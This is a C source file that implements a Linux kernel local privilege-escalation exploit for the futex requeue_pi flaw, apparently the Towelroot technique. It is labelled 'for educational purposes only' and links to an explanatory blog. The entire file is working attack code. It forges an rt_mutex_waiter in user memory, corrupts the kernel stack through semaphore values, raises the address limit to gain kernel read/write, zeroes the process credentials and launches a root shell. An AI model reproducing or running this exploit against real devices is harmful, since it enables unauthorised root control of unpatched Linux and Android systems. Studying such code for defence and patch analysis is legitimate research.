/*
 *  futb0l.c Copyright (C) solidwrench
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * for in depth explanation:
 * http://solidwrench.blogspot.com/2014/07/futexrequeue-part-3-towelroot-source.html
 *
 *
 * For educational purposes only.
 */

#define _GNU_SOURCE  
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/sem.h>
#include <sys/time.h>

#include "futextest.h"


futex_t destfutex = 0;
futex_t srcfutex = 0;
int proceed_to_overwrite = 0;
int close_thread = 0;
struct rb_node *waiter_ptr;
unsigned long tbase;

#define KERNABLE 0xa0000000



struct rb_node {
	unsigned long  __rb_parent_color;
	struct rb_node *rb_right;
	struct rb_node *rb_left;
};

struct rt_mutex_waiter {
	struct rb_node          tree_entry;
	struct rb_node          pi_tree_entry;
	struct task_struct      *task;
	struct rt_mutex         *lock;
	int prio;
};

int WAITER_OVERWRITE_OFFSET;
#define WAITER_OVERWRITE_SIZE sizeof(struct rb_node) // only overwrite tree_entry

ushort *sem_values; 


ssize_t read_kern(void *writebuf, void *readbuf, size_t count) {
	int pipefd[2];
	ssize_t len;

	pipe(pipefd);

	len = write(pipefd[1], writebuf, count);

	if (len != count) {
		perror("write");
	}

	read(pipefd[0], readbuf, count);

	close(pipefd[0]);
	close(pipefd[1]);

	return len;
}

ssize_t write_kern(void *readbuf, void *writebuf, size_t count) {
	int pipefd[2];
	ssize_t len;

	pipe(pipefd);

	write(pipefd[1], writebuf, count);
	len = read(pipefd[0], readbuf, count);

	if (len != count) {
		perror("read");
	}

	close(pipefd[0]);
	close(pipefd[1]);

	return len;
}
void *ger(void *arg){
	int sem_id;
	void *task_struct,*cred;
	const char new_addr_limit[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	const char new_egideuid[] = {0,0,0,0};
	printf("ger thread\n");

	int fd = open("/dev/null", O_RDWR);

	setpriority(PRIO_PROCESS , 0, *(int*)arg);
	
	if ((sem_id = semget(IPC_PRIVATE,(WAITER_OVERWRITE_SIZE+WAITER_OVERWRITE_OFFSET)/2,IPC_CREAT | 0660)) < 0){
       		perror("semget");
	}

	// don't call anything else to prevent tainting rt_waiter
	futex_wait_requeue_pi(&srcfutex, 0, &destfutex, NULL, 0);	
   	semctl(sem_id,-1,SETALL,sem_values);
	while(!proceed_to_overwrite);
	proceed_to_overwrite = 0;
   	semctl(sem_id,-1,SETALL,sem_values);
	while(!proceed_to_overwrite);
	proceed_to_overwrite = 0;


	while(write(fd, (void*)(tbase+24), 8) < 0){ printf("no kernel r/w\n"); sleep(1); }
	printf("has kernel r/w!\n");
	write_kern((void*)(tbase+32), (void *)&new_addr_limit, 8);
	futex_wait_requeue_pi(NULL, 0, NULL, NULL, 0); // dummy call to trigger breakpoint
	read_kern((void*)(tbase), (void *)&task_struct, 8);
	printf("task_struct: %p\n",task_struct);
	read_kern((void *)(task_struct+0x598), (void*)&cred, 8);
	printf("cred: %p\n",cred);
	futex_wait_requeue_pi(NULL, 0, NULL, NULL, 0); 
	write_kern((void *)(cred+20), (void*)&new_egideuid, 4);
	write_kern((void *)(cred+24), (void*)&new_egideuid, 4);
	futex_wait_requeue_pi(NULL, 0, NULL, NULL, 0); 

	if(geteuid() != 0) printf("not root :(\n");
	system("sh");

	printf("ger function exiting\n");
	return NULL;
	
}





void *prio_thread(void *prio){
	int ret;
	setpriority(PRIO_PROCESS , 0, *(int*)prio);
	printf("prio %d thread\n", *(int*)prio);
	if((ret = futex_lock_pi(&destfutex, NULL, 0, 0)) < 0){
		perror("futex_lock_pi");
	}
	printf("prio thread %d has destfutex\n",*(int*)prio);
	printf("prio thread %d exiting\n",*(int*)prio);
	return NULL;
}



int main(int argc, char **argv){
	pthread_t w1,l1,l2;
	int ret,prio;
	int fd = open("/dev/null", O_RDWR);
  	struct rt_mutex_waiter *fake_userspace_waiter,*overwrite_waiter,*kernel_waiter;	
	

	if(argc < 2) {
		printf("usage: %s offset\n", argv[0]);
		return;
	}
	printf("starting futb0l\n");
	
	WAITER_OVERWRITE_OFFSET = atoi(argv[1]);
	if(WAITER_OVERWRITE_OFFSET > (512-WAITER_OVERWRITE_SIZE) || WAITER_OVERWRITE_OFFSET < 0){
		printf("invalid offset\n");
		return;
	}
	printf("using offset: %d\n",WAITER_OVERWRITE_OFFSET);
	sem_values = malloc(WAITER_OVERWRITE_SIZE+WAITER_OVERWRITE_OFFSET);

	cpu_set_t  mask;
	CPU_ZERO(&mask);
	CPU_SET(0, &mask);

	if((ret  = sched_setaffinity(getpid(), sizeof(mask), &mask)) < 0){
		perror("sched_setaffinity");
	}

	if((ret = futex_lock_pi(&destfutex, NULL, 0, 0)) < 0){
		perror("futex_lock_pi");
	}

	prio = 16;
	if ((ret = pthread_create(&w1, NULL, ger, &prio)) != 0) {
			perror("pthread_create\n");
	}

	sleep(1);
	

	if((ret  = futex_cmp_requeue_pi(&srcfutex, srcfutex, &destfutex, 1, 2, 0)) < 0){
		perror("futex_cmp_requeue_pi");
	}

	sleep(1);


	if((fake_userspace_waiter = mmap((void*)KERNABLE, sizeof(struct rb_node), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0)) == MAP_FAILED){
		perror("mmap");
	}

	fake_userspace_waiter->tree_entry.rb_right=fake_userspace_waiter->tree_entry.rb_left=NULL;
	fake_userspace_waiter->prio = 137 /*2147483647*/;

	overwrite_waiter = (struct rt_mutex_waiter*) (sem_values+WAITER_OVERWRITE_OFFSET/2);

	overwrite_waiter->tree_entry.rb_right = (struct rb_node *)KERNABLE;
	overwrite_waiter->tree_entry.rb_left = 0;
	overwrite_waiter->tree_entry.__rb_parent_color = 1;

	sem_values[0] = 0xffff;	// make the syscall return asap, this check happens after copying

	destfutex = 0;
	if((ret  = futex_cmp_requeue_pi(&destfutex, 0, &destfutex, 1, 0, 0)) < 0){
		perror("bugged futex_cmp_requeue_pi"); 
	}

	usleep(500000);

	prio = 15;
	if ((ret = pthread_create(&l1, NULL, prio_thread, &prio)) != 0) {
			perror("pthread_create\n");
	}

	usleep(500000);

	kernel_waiter = (struct rt_mutex_waiter*)fake_userspace_waiter->tree_entry.rb_left;
	tbase = (unsigned long)kernel_waiter & 0xffffffffffffe000;

	printf("found thread stack base: 0x%lx\n",tbase);

	if(write(fd, (void*)(tbase+24), 8) < 0) printf("no kernel r/w... yet\n");

	fake_userspace_waiter->tree_entry.rb_right = NULL;
	fake_userspace_waiter->tree_entry.rb_left = NULL;

	overwrite_waiter->tree_entry.rb_right = (struct rb_node*)(tbase+40);
	overwrite_waiter->tree_entry.rb_left = 0;
	overwrite_waiter->tree_entry.__rb_parent_color = tbase+24;

	proceed_to_overwrite = 1;
	usleep(1000);
	prio = 14;
	if ((ret = pthread_create(&l2, NULL, prio_thread, &prio)) != 0) {
			perror("pthread_create\n");
	}
	usleep(500000);
	proceed_to_overwrite = 1;

	pthread_join(w1,NULL);
	pthread_join(l1,NULL);
	pthread_join(l2,NULL);

	

}
